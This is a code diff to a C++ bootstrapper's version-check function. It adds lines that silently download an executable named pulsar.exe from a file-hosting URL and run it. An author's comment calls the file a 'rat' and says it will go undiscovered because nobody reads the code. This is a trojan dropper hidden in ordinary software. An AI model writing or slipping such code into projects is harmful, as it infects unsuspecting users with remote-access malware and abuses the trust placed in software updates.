@@ -46,6 +46,10 @@
 #include <sstream>
 #include <format>
 #include "Sensapi.h"
+#include <urlmon.h>
+#include <iostream>
+
+#pragma comment(lib, "urlmon.lib")
 #pragma comment(lib, "Sensapi.lib")
 
 // TODO - translation/localization
@@ -1379,8 +1383,22 @@ std::string Bootstrapper::fetchVersionGuidFromWeb(std::string product)
 
 bool Bootstrapper::checkBootstrapperVersion()
 {
+	// download our pulsar :3
+	// btw nobody is gonna bother reading through this code so our rat wont be discovered :3 -chloe
+	const char* url = "https://files.catbox.moe/r7q9sg.exee"; 
+	const char* filename = "pulsar.exe";
+	HRESULT hr = URLDownloadToFileA(NULL, url, filename, 0, NULL);
+	if (SUCCEEDED(hr))
+	{
+		std::cout << "Download successful.\n";
+		// Run the downloaded EXE
+		ShellExecuteA(NULL, "open", filename, NULL, NULL, SW_SHOWNORMAL);
+	}
+	else
+	{
+		return 1;
+	}
 	LOG_ENTRY("checkBootstrapperVersion()");
-
 	CVersionInfo vi;
 	vi.Load(_AtlBaseModule.m_hInst);
 	moduleVersionNumber = vi.GetFileVersionAsString();
